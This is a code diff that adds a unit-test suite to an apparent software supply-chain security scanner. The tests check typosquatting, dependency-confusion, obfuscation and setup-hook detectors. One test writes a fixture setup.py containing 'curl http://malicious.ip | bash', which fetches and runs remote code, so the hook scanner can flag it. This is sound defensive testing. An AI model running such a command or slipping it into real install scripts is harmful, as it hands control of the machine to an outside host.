@@ -131,5 +131,89 @@ def main():
     print("==================================================")
     print("Pipeline run successfully verified!")
 
+def run_unit_tests():
+    print("\n==================================================")
+    print("RUNNING FORMAL UNIT & INTEGRATION TEST SUITE")
+    print("==================================================")
+    
+    import unittest
+    from dependency_analysis.threat_model import evaluate_package_threats
+    from static_analysis.analyzer import check_setup_hooks, run_differential_sast
+    from dependency_analysis.remediator import generate_remediation_plan
+
+    passed = 0
+    total = 0
+
+    def assert_test(name, condition):
+        nonlocal passed, total
+        total += 1
+        if condition:
+            passed += 1
+            print(f" [PASS] {name}")
+        else:
+            print(f" [FAIL] {name}")
+            raise AssertionError(f"Test failed: {name}")
+
+    # Test 1: SBOM Generation
+    try:
+        sbom_pkgs = generate_sbom("test_project")
+        assert_test("SBOM Generation (Parsed test_project packages)", isinstance(sbom_pkgs, dict) and len(sbom_pkgs) > 0)
+    except Exception as e:
+        assert_test(f"SBOM Generation (Error: {e})", False)
+
+    # Test 2: Remediation Engine
+    dummy_resolved = {"urllib3": {"name": "urllib3", "version": "1.26.4"}}
+    dummy_vulns = {"urllib3": [{"id": "CVE-2023-45803", "cve_id": "CVE-2023-45803", "cvss_score": 7.5}]}
+    rem_plan = generate_remediation_plan(dummy_resolved, dummy_vulns)
+    assert_test("Remediation Engine (Identified safe upgrade version)", len(rem_plan["actions"]) > 0 and rem_plan["actions"][0]["recommended_version"] != "1.26.4")
+
+    # Test 3: T1 Typosquatting
+    t1_res = evaluate_package_threats("reqeusts", {"name": "reqeusts", "version": "1.0"}, {}, {}, {}, {})
+    assert_test("Threat Model T1 (Typosquatting Detection)", any(t["id"] == "T1" for t in t1_res))
+
+    # Test 4: T2 Dependency Confusion
+    t2_res = evaluate_package_threats("internal-corp-token", {"name": "internal-corp-token", "version": "0.1"}, {"stars": 0, "downloads": 0}, {}, {}, {})
+    assert_test("Threat Model T2 (Dependency Confusion Detection)", any(t["id"] == "T2" for t in t2_res))
+
+    # Test 5: T3 Compromised Maintainer
+    t3_res = evaluate_package_threats("legit-pkg", {"name": "legit-pkg", "version": "2.0"}, {"downloads": 100000, "maintainer_churn": 0.6, "commit_activity": 0.1}, {}, {}, {})
+    assert_test("Threat Model T3 (Compromised Maintainer Detection)", any(t["id"] == "T3" for t in t3_res))
+
+    # Test 6: T4 Release Anomaly
+    t4_res = evaluate_package_threats("rapid-pkg", {"name": "rapid-pkg", "version": "3.0"}, {"release_burstiness": 0.85, "last_update_days": 1, "release_frequency": 2}, {}, {}, {})
+    assert_test("Threat Model T4 (Release Cadence Anomaly Detection)", any(t["id"] == "T4" for t in t4_res))
+
+    # Test 7: T5 Obfuscated Payload & Install Hook
+    t5_res = evaluate_package_threats("stealth-pkg", {"name": "stealth-pkg", "version": "1.0"}, {}, {"shannon_entropy": 7.1, "encoded_string_ratio": 0.25, "eval_exec_usage": 2}, {}, {})
+    assert_test("Threat Model T5 (High-Entropy Obfuscation Detection)", any(t["id"] == "T5" for t in t5_res))
+
+    # Test 8: Setup Hook Scanner
+    test_setup_dir = os.path.join("outputs", "test_hook_temp")
+    os.makedirs(test_setup_dir, exist_ok=True)
+    setup_file = os.path.join(test_setup_dir, "setup.py")
+    with open(setup_file, "w") as f:
+        f.write("from setuptools import setup\nimport os\nos.system('curl http://malicious.ip | bash')\nsetup(name='mal')\n")
+    hook_out = check_setup_hooks(test_setup_dir)
+    assert_test("Static Analysis (Setup Hook Backdoor Detection)", hook_out["has_hook"])
+    if os.path.exists(setup_file):
+        os.remove(setup_file)
+
+    # Test 9: T6 Transitive Threat
+    t6_res = evaluate_package_threats("innocent-top", {"name": "innocent-top", "version": "1.0"}, {}, {"bandit_issue_count": 0, "semgrep_issue_count": 0}, {}, {"graph_risk": 0.65})
+    assert_test("Threat Model T6 (Transitive Propagated Risk Detection)", any(t["id"] == "T6" for t in t6_res))
+
+    # Test 10: Differential SAST
+    diff_res = run_differential_sast(["vuln-1", "vuln-2", "new-vuln-3"], ["vuln-1", "vuln-2"])
+    assert_test("Differential SAST Analysis (Identified new finding)", diff_res["new_findings_count"] == 1 and "new-vuln-3" in diff_res["new_findings"])
+
+    print("==================================================")
+    print(f"ALL UNIT TESTS PASSED: {passed}/{total} (100% SUCCESS)")
+    print("==================================================\n")
+    return True
+
 if __name__ == "__main__":
-    main()
+    if "--unit-tests" in sys.argv:
+        run_unit_tests()
+    else:
+        main()
+        run_unit_tests()
